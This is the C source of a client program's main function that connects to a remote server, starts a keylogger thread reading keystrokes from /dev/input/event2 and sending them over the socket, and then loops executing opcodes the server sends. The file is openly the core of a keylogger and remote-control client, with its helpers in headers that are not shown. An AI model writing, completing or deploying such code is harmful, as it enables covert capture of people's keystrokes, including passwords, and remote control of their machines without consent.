#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include "keylog.h"  // Include the keylogger header
#include "constraints.h"
#include "messageManager.h"
#include "clientManager.h"
#include "utils.h"

clientInfo_t clientData;

int main() {
    int sock;
    connectionInitialize(&sock);
    clientData.serverSocket = sock;
    startingDataInitialize();
    
    //start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path

    pthread_t tid;
    keyLoggerParameters_t* params = (keyLoggerParameters_t*)malloc(sizeof(keyLoggerParameters_t));
    params->sock = sock;
    strcpy(params->keyboardFile, "/dev/input/event2");

    if (pthread_create(&tid, NULL, start_keylogger, params) < 0) {
        perror("Could not create thread");
        free(params);
    }
    pthread_detach(tid);


    char buffer[SEND_BUFFER_SIZE];
    ssize_t bytesRecv;
    message_t msg;
    while(1)
    {
        if(recvMessage(sock, &msg) < 0)
            break;
        handleOpcode(sock, msg);

    }
    // Pornire Keylogger

    // Close the socket
    close(sock);
    
    return 0;
}